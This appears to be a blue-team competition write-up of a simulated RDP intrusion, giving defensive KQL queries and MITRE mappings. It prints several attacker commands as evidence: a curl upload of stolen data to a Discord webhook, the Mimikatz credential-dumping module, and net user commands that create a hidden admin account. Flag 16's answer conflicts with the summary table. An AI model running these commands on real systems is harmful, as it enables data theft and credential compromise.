
<img width="1536" height="1024" alt="Port of entry Image" src="https://github.com/user-attachments/assets/fcfd59d8-503c-45b0-8080-0df78134b07b" />
<h1>🛡️ Port of Entry – RDP Intrusion (2025)</h1>
Cyber Range Community Threat Hunt Case Study

This directory contains the complete investigation, forensic analysis, and incident response documentation for the Azuki Port of Entry  RDP Intrusion, a structured threat hunt challenge from the Cyber Range Community Threat Hunting Competition. 

I completed this hunt as part of a competitive blue-team event and achieved a 4th place finish, demonstrating strong threat-hunting speed, accuracy, and IR methodology.

The scenario simulated a targeted compromise against Azuki Import/Export, a logistics company in Japan/SE Asia.

During the intrusion, the attacker:
<ul>
    <li>Used RDP with stolen credentials</li>
    <li>Disabled security tools</li>
    <li>Established a hidden staging directory</li>
    <li>Dumped credentials from LSASS</li>
    <li>Archived and exfiltrated contract data</li>
    <li>Maintained persistence</li>
    <li>Attempted lateral movement</li>
</ul>




<h2>INCIDENT RESPONSE REPORT</h2>

On November 19th, 2025, Azuki Import/Export experienced a targeted intrusion involving credential compromise, remote access, credential dumping, data theft, and exfiltration to a Discord webhook. The attacker leveraged RDP using stolen credentials, established persistence, disabled security controls, stole internal contract data, and uploaded it via HTTPS. The intrusion lasted several hours and involved anti-forensics and attempted lateral movement.


Date of Report: [2025-12-01]

Severity Level:High

Status: Contained



<h3>Flag 1: Initial Access</h3>

Remote Desktop Protocol connections leave network traces that identify the source of unauthorised access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.

<h3>KQL Query:</h3>

I decided to check th edevice logon events during the time range of the suspected incident.
DeviceLogonEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| project Timestamp, DeviceName, AccountName, LogonType, ActionType, RemoteIP, RemoteDeviceName<br>
| order by Timestamp asc <br>


<img width="1243" height="440" alt="Flag 1 Return" src="https://github.com/user-attachments/assets/da03a46f-6398-42ea-ac45-97c3a16ca7b9" />

The query results showed a suspicious sequence of a LogonFailure followed by a successful logon from the external IP address 88.97.178.12.

🚩 Flag 1 - 88.97.178.12


<h3>Flag 2: INITIAL ACCESS - Compromised User Account</h3>

Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts including password resets and privilege reviews.

<img width="1243" height="201" alt="image" src="https://github.com/user-attachments/assets/faded648-398d-4784-b43f-692011aaa51e" />

The external IP authenticated using the kenji.sato account, confirming it as the compromised credential.

🚩 Flag 2 - kenji.sato


<h3>Flag 3: DISCOVERY - Network Reconnaissance</h3>

Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. This reconnaissance activity is a key indicator of advanced persistent threats.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| project Timestamp, FileName, ProcessCommandLine, AccountName <br>
| order by Timestamp asc <br>

<img width="1243" height="146" alt="image" src="https://github.com/user-attachments/assets/e8287092-2c02-4eeb-8094-855e788694c5" />

The attacker executed arp -a, indicating an attempt to enumerate local network hosts and their associated MAC addresses.

🚩 Flag 3 - arp -a

<h3>Flag 4: DEFENCE EVASION - Malware Staging Directory</h3>

Attackers establish staging locations to organise tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where ProcessCommandLine has_any ("mkdir", "md ", "New-Item", "attrib") <br>
| project Timestamp, FileName, ProcessCommandLine, AccountName <br>
| order by Timestamp asc <br>

<img width="1243" height="180" alt="image" src="https://github.com/user-attachments/assets/fe8704cc-0ee7-4da6-b1b8-23562ba5045e" />

The query revealed that attrib.exe was used to apply hidden and system attributes to the directory, effectively concealing it and making it appear like a legitimate system folder.

🚩 Flag 4 - C:\ProgramData\WindowsCache

<h3>Flag 5: DEFENCE EVASION - File Extension Exclusions</h3>

Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. Counting these exclusions reveals the scope of the attacker's defense evasion strategy.

<h3>KQL Query:</h3>

DeviceRegistryEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where RegistryKey has @"Windows Defender\Exclusions\Extensions" <br>
| project Timestamp, RegistryValueName, RegistryValueData, ActionType <br>
| order by Timestamp asc <br>

<img width="1241" height="139" alt="image" src="https://github.com/user-attachments/assets/ecbb8a66-9239-4eb8-a6c7-cbf89633df7f" />

The KQL results showed that the attacker added three file extension exclusions to Windows Defender, preventing these file types from being scanned

🚩 Flag 5 - 3 files.

<h3>Flag 6: DEFENCE EVASION - Temporary Folder Exclusion</h3>

Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.

DeviceRegistryEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where RegistryKey has @"Windows Defender\Exclusions\Paths" <br>
| project Timestamp, RegistryValueName, RegistryValueData, ActionType <br>
| order by Timestamp asc <br>

<img width="1240" height="168" alt="image" src="https://github.com/user-attachments/assets/80240e9f-789b-49bc-8819-67ef77f18113" />

Further investigation revealed that the attacker added the Temp directory (C:\Users\KENJI~1.SAT\AppData\Local\Temp) as a Defender exclusion. This allowed any malicious files placed or executed in this location to bypass antivirus scanning and remain undetected.

🚩 Flag 6 - C:\Users\KENJI~1.SAT\AppData\Local\Temp

<h3>Flag 7: DEFENCE EVASION - Download Utility Abuse</h3>

Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where ProcessCommandLine has_any ("http", "https") <br>
| project Timestamp, FileName, ProcessCommandLine <br>
| order by Timestamp asc <br>

During analysis, I identified that certutil.exe a legitimate Windows utility was executed from the suspicious WindowsCache directory to download external files. 

<img width="1240" height="115" alt="image" src="https://github.com/user-attachments/assets/a1f4463f-c0d2-4047-9398-d36db86efe4f" />

🚩 Flag 7 - certutil.exe

<h3>Flag 8: PERSISTENCE - Scheduled Task Name</h3>

Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where FileName =~ "schtasks.exe" <br>
| project Timestamp, FileName, ProcessCommandLine, AccountName <br>
| order by Timestamp asc <br>

After running a query on scheduled task creation events, I identified two entries showing the attacker configuring a task named “Windows Update Check”, pointing to the malicious payload in C:\ProgramData\WindowsCache\. This confirms the use of scheduled tasks for persistence.

<img width="1240" height="92" alt="image" src="https://github.com/user-attachments/assets/290efd50-96f8-458a-95d2-bee4c7fff76e" />

🚩 Flag 8 - Windows Update Check

<h3>Flag 9: PERSISTENCE - Scheduled Task Target</h3>

The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where FileName =~ "schtasks.exe" <br>
| where ProcessCommandLine has "Windows Update Check" <br>
| project Timestamp, ProcessCommandLine <br>

Although named after the legitimate Windows system process svchost.exe, this file was placed in a non-standard directory C:\ProgramData\WindowsCache and therefore represents a malicious persistence payload.

<img width="1240" height="137" alt="image" src="https://github.com/user-attachments/assets/305e4244-0cd3-4041-b8b4-a13240ede16b" />

🚩 Flag 9 - C:\ProgramData\WindowsCache\svchost.exe

<h3>Flag 10: COMMAND & CONTROL - C2 Server Address</h3>

Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.

<h3>KQL Query:</h3>

DeviceNetworkEvents <br> 
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where InitiatingProcessFileName =~ "svchost.exe" <br>
| project Timestamp, RemoteIP, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine <br>
| order by Timestamp asc <br>

Using DeviceNetworkEvents, ive identified that this fake svchost.exe initiated outbound connections to the external IP: 78.141.196.6

<img width="1240" height="164" alt="image" src="https://github.com/user-attachments/assets/1e323e71-cdc3-41ab-8479-58efc2c306e5" />

🚩 Flag 10 - 78.141.196.6

<h3>Flag 11: COMMAND & CONTROL - C2 Communication Port</h3>

C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.

<h3>KQL Query:</h3>

DeviceNetworkEvents <br> 
| where DeviceName == "azuki-sl" <br> 
| where RemoteIP == "78.141.196.6" <br> 
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine <br> 
| order by Timestamp asc <br> 

The malicious persistence executable C:\ProgramData\WindowsCache\svchost.exe initiated outbound connections to its command-and-control server at 78.141.196.6 over TCP port 443.
Port 443 is commonly used for encrypted HTTPS traffic, allowing the attacker to blend C2 traffic with legitimate web traffic and evade firewall and IDS detection.

<img width="1240" height="120" alt="image" src="https://github.com/user-attachments/assets/f50f7de3-4818-4850-974c-5a4c528f5b14" />

🚩 Flag 11 - 443

<h3>Flag 12: CREDENTIAL ACCESS - Credential Theft Tool</h3>
Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.

<h3>KQL Query:</h3>
DeviceProcessEvents <br> 
| where DeviceName == "azuki-sl" <br> 
| where ProcessCommandLine has_any ("lsass", "lsass.exe", "comsvcs.dll", "MiniDump", "sekurlsa") <br> 
| project Timestamp, FileName, ProcessCommandLine <br> 
| order by Timestamp asc <br>  

A suspicious executable named mm.exe was downloaded into the attacker’s staging directory at C:\ProgramData\WindowsCache.

<img width="1240" height="117" alt="image" src="https://github.com/user-attachments/assets/95baeff9-6db5-4002-98c5-2f20a86be66c" />

🚩 Flag 12 - mm.exe

<h3>Flag 13: CREDENTIAL ACCESS - Memory Extraction Module</h3>

Credential dumping tools use specific modules to extract passwords from security subsystems. Documenting the exact technique used aids in detection engineering.


Analysis of the command line for the credential dumping tool (mm.exe) shows it invoked the Mimikatz memory extraction module sekurlsa::logonpasswords, which is used to retrieve usernames and plaintext passwords, NTLM hashes, Kerberos tickets, and other authentication material directly from LSASS memory.

Resource used: <a href="https://github.com/gentilkiwi/mimikatz/wiki">Mimikatz</a>

🚩 Flag 13 - sekurlsa::logonpasswords
 
<h3>Flag 14: COLLECTION - Data Staging Archive</h3>

Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.

<h3>KQL Query:</h3>

DeviceFileEvents<br>
| where DeviceName == "azuki-sl" <br>
| where FolderPath has "C:\\ProgramData\\WindowsCache" <br>
| where FileName endswith ".zip" <br>
| project Timestamp, FileName, FolderPath, ActionType <br>
| order by Timestamp asc <br>

Query results showed that export-data.zip was staged in the hidden directory C:\ProgramData\WindowsCache*, indicating preparation for data exfiltration.

<img width="1240" height="142" alt="image" src="https://github.com/user-attachments/assets/bee7dddf-3b1e-4471-8183-995e23beb5f6" />

🚩 Flag 14 - export-data.zip

<h3>Flag 15: EXFILTRATION - Exfiltration Channel</h3>
 
Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
| where ProcessCommandLine has_any ("http", "https") <br>
| project Timestamp, FileName, ProcessCommandLine <br>
| order by Timestamp asc <br>

The attacker used curl.exe to upload the staged archive export-data.zip to a Discord webhook URL.

curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/...

This represents data exfiltration via an encrypted HTTPS channel to a third-party cloud service (Discord).

Because Discord webhooks do not require authentication and accept arbitrary file uploads, the attacker was able to exfiltrate stolen contract and pricing data with minimal detection.

<img width="1240" height="108" alt="image" src="https://github.com/user-attachments/assets/93b7ac83-240f-4295-aa75-2b0683a1c4cf" />

🚩 Flag 15 - Discord


<h3>Flag 16: ANTI-FORENSICS - Log Tampering</h3>

Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where FileName =~ "wevtutil.exe" <br>
| project Timestamp, ProcessCommandLine <br>
| order by Timestamp asc <br>

The attacker initiated log clearing using wevtutil.exe, beginning with the Security event log.

Clearing the Security log first is a common anti-forensics step because it contains authentication events, RDP logons, privilege escalations, scheduled task creation, and credential access detections — all critical evidence of the compromise.

<img width="1240" height="85" alt="image" src="https://github.com/user-attachments/assets/126bfff0-3259-416e-9cc2-a99232308823" />

🚩 Flag 16 - Discord


<h3>Flag 17: IMPACT - Persistence Account</h3>

Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where ProcessCommandLine has "/add" <br>
| project Timestamp, AccountName, ProcessCommandLine <br>
| order by Timestamp asc <br>

The attacker created a local account named support using net user support <password> /add and added it to the Administrators group with net localgroup administrators support /add.

<img width="1240" height="198" alt="image" src="https://github.com/user-attachments/assets/0dd2f64a-1975-4ccd-8bb5-f98b636d5a40" />

🚩 Flag 17 - support

<h3>Flag 18: EXECUTION - Malicious Script</h3>

Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where ProcessCommandLine has_any (".ps1", ".bat", "Invoke-WebRequest", "iwr", "wget") <br>
| project Timestamp, FileName, ProcessCommandLine <br>
| order by Timestamp asc <br>

A malicious PowerShell script named wupdate.ps1 was created in a temporary directory shortly after the attacker’s initial RDP access.

<img width="1240" height="141" alt="image" src="https://github.com/user-attachments/assets/ea06fb4f-a891-4a6e-93c2-f9c11c9c6d6a" />

🚩 Flag 18 - wupdate.ps1

<h3>Flag 19: LATERAL MOVEMENT - Secondary Target</h3>
Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.

<h3>KQL Query:</h3>

DeviceProcessEvents <br>
| where DeviceName == "azuki-sl" <br>
| where ProcessCommandLine has_any ("cmdkey", "mstsc", "/add:", "/v:") <br>
| project Timestamp, ProcessCommandLine <br>
| order by Timestamp asc <br>

DeviceProcessEvents show that the attacker attempted lateral movement by targeting the internal host 10.1.0.188.

This activity occurred near the end of the intrusion after credential dumping and persistence were established. The attacker used commands consistent with lateral movement techniques — such as cmdkey.exe /add: to store credentials and mstsc.exe /v: to initiate an RDP session.

<img width="1239" height="171" alt="image" src="https://github.com/user-attachments/assets/c5ecc65d-1e7c-4d99-a229-0ce792b13a76" />

🚩 Flag 19 - 10.1.0.188

<h3>Flag 20: LATERAL MOVEMENT - Remote Access Tool</h3>
Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.

Near the end of the intrusion, the attacker attempted to laterally move to 10.1.0.188 using the built-in Windows RDP client mstsc.exe.

🚩 Flag 20 - mstsc.exe




<h2>Summary of Findings</h2>

| Flag # | Category                  | Finding                                   |
| ------ | ------------------------- | ----------------------------------------- |
| 1      | Initial Access            | `88.97.178.12`                            |
| 2      | Compromised Account       | `kenji.sato`                              |
| 3      | Discovery                 | `arp -a`                                  |
| 4      | Staging Directory         | `C:\ProgramData\WindowsCache`             |
| 5      | File Extension Exclusions | `3`                                       |
| 6      | Folder Exclusion          | `C:\Users\KENJI~1.SAT\AppData\Local\Temp` |
| 7      | LOLBIN Download Utility   | `certutil.exe`                            |
| 8      | Persistence Task Name     | `Windows Update Check`                    |
| 9      | Persistence Task Target   | `C:\ProgramData\WindowsCache\svchost.exe` |
| 10     | C2 Server                 | `78.141.196.6`                            |
| 11     | C2 Port                   | `443`                                     |
| 12     | Credential Theft Tool     | `mm.exe`                                  |
| 13     | Memory Extraction Module  | `sekurlsa::logonpasswords`                |
| 14     | Data Archive              | `export-data.zip`                         |
| 15     | Exfiltration Channel      | `Discord`                                 |
| 16     | Log Cleared               | `Security`                                |
| 17     | Persistence Account       | `support`                                 |
| 18     | Malicious Script          | `wupdate.ps1`                             |
| 19     | Lateral Movement Target   | `10.1.0.188`                              |
| 20     | Lateral Movement Tool     | `mstsc.exe`                               |



<h2>MITRE Summary by Tactic</h2>

<h3>Execution</h3>
T1059.001 – PowerShell execution via malicious script (wupdate.ps1).

<h3>Discovery</h3>
T1016 – Network configuration discovery via arp -a. <br>
T1083 – File and directory discovery within staging areas. <br>
T1057 – Process discovery during reconnaissance. <br>

<h3>Defense Evasion</h3>
T1562.001 – Security tool modification through Defender exclusions. <br>
T1036.004 – Masquerading via hidden/system attributes (WindowsCache).<br>

<h3>Credential Access</h3>
T1003.001 – Credential dumping from LSASS using sekurlsa::logonpasswords.

<h3>Persistence</h3>
T1053.005 – Scheduled task persistence (“Windows Update Check”).

<h3>Lateral Movement</h3> 
T1021.001 – RDP-based lateral movement via mstsc.exe. <br>
T1550.002 – Using stored credentials with cmdkey for remote access. <br>

<h3>Collection</h3>
T1560.001 – Data staged via ZIP archive (export-data.zip).

<h3>Command & Control</h3>
T1071.001 – C2 communication over HTTPS to 78.141.196.6:443.

<h3>Exfiltration</h3>
T1567.002 – Exfiltration to cloud service via Discord webhook.

<h3>Impact / Anti-Forensics</h3>
T1070.001 – Event log clearing using wevtutil.exe.
